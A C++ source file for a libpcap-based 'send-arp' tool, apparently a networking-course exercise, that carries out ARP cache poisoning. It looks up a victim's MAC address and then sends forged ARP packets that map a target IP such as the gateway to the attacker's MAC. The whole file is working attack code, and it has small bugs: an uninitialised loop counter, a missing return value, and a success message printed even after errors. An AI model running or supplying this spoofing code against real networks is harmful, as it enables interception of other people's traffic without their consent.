#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getadds.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

char attacker_ip[80];
char attacker_mac[80];
char iface[80];
Mac a_mac;
Ip a_ip;

int get_s_mac(char* s_ip, char* s_mac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = a_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.eth_.smac_ = a_mac;
	packet.arp_.sip_ = htonl(a_ip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(s_ip));

	printf("sending normal ARP packet to victim...\n");
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	sleep(3); // because getting arp reply can take some time

	for(int i;i<1000;i++) {
        struct pcap_pkthdr *pkt_header;
        const u_char *pkt_data;
        int res = pcap_next_ex(handle, &pkt_header, &pkt_data);

        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

		EthArpPacket* arp_pkt = (EthArpPacket *)pkt_data;

        if(arp_pkt->eth_.type_ != htons(EthHdr::Arp))continue;
		if(arp_pkt->arp_.op_ != htons(ArpHdr::Reply))continue;
		if(memcmp(arp_pkt->eth_.dmac_.mac_, a_mac.mac_, 6)!=0)continue;
		if(Ip(s_ip).ip_ != htonl(arp_pkt->arp_.sip_.ip_))continue;

		uint8_t* mac_str = (uint8_t*)arp_pkt->arp_.smac_;
		sprintf(s_mac, "%02x:%02x:%02x:%02x:%02x:%02x", mac_str[0], mac_str[1], \
					mac_str[2], mac_str[3], mac_str[4], mac_str[5]);

		pcap_close(handle);

		return 0;
	}
	return -1;
}

int arp_inf_attack(char* s_ip, char* t_ip){
	char s_mac[80];

	if(get_s_mac(s_ip, s_mac)!=0){
		printf("failed to get victim MAC address!\n");
		return -1;
	}
	printf("successfully got victim MAC\n");

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
		return -1;
	}
	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(s_mac);
	packet.eth_.smac_ = a_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.eth_.smac_ = a_mac;
	packet.arp_.sip_ = htonl(Ip(t_ip));
	packet.arp_.tmac_ = Mac(s_mac);
	packet.arp_.tip_ = htonl(Ip(s_ip));

	printf("sending attack ARP packet to victim...\n");
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}

int main(int argc, char* argv[]) {
	
	if (argc < 4 || argc%2==1) {
		usage();
		return -1;
	}

	int counter = argc/2-1;

	strcpy(iface, argv[1]);

	if(get_ip(attacker_ip, argv[1])!=0){
		printf("error getting ip!\n");
		return -1;
	}

	if(get_mac(attacker_mac, argv[1])!=0){
		printf("error getting mac!\n");
		return -1;
	}

	a_mac = Mac(attacker_mac);
	a_ip = Ip(attacker_ip);

	for(int i = 0; i < counter;i++){
		if(arp_inf_attack(argv[2*i+2], argv[2*i+3])!=0){
			printf("error while attacking!\n");
		}
		printf("attack succesful!\n");
	}
}
